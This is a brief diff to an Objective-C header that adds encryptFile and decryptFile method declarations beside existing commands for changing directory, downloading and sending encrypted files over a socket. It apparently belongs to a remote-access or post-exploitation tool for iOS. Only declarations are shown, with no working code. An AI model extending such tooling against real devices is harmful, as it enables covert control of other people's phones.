@@ -48,6 +48,8 @@ extern int sockfd;
 -(void)changeWD:(NSArray *)args;
 -(void)sendEncryptedFile:(NSData *)fileData;
 -(void)download:(NSArray *)args;
+-(void)encryptFile:(NSArray *)args;
+-(void)decryptFile:(NSArray *)args;
 
 //misc
 extern int SBSLaunchApplicationWithIdentifier(CFStringRef identifier, Boolean suspended);
